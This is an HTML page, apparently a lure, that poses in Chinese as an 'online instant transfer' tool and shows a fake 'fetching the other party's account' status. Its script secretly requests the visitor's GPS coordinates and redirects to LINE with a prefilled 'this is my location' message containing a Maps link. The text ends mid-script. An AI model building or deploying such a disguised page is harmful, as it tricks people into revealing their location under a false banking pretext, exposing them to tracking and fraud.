<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>線上立即轉帳</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 25px; font-size: 20px; }
        #status { margin-top: 20px; font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <h2>線上立即轉帳</h2>
    <p>按下按鈕將自動開啟轉帳功能</p>
    <button onclick="sendLocation()">下一步</button>
    <p id="status"></p>

    <script>
        function sendLocation() {
            document.getElementById("status").innerText = "正在取得對方帳號...";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const text = `這是我的位置：\nhttps://maps.google.com/?q=${lat},${lon}`;
                    const lineURL = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
                    document.getElementById("status").innerText = "正在開啟 LINE...";
                    window.location.href = lineURL;
                }, function(error) {
                    let msg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED: msg = "您拒絕了位置存取"; break;
                        case error.POSITION_UNAVAILABLE: msg = "無法取得位置資訊"; break;
                        case error.TIMEOUT: msg = "定位請求逾時"; break;
                        default: msg = "未知錯誤"; break;
                    }
                    document.getElementById("status").innerText = msg;
                });
            }
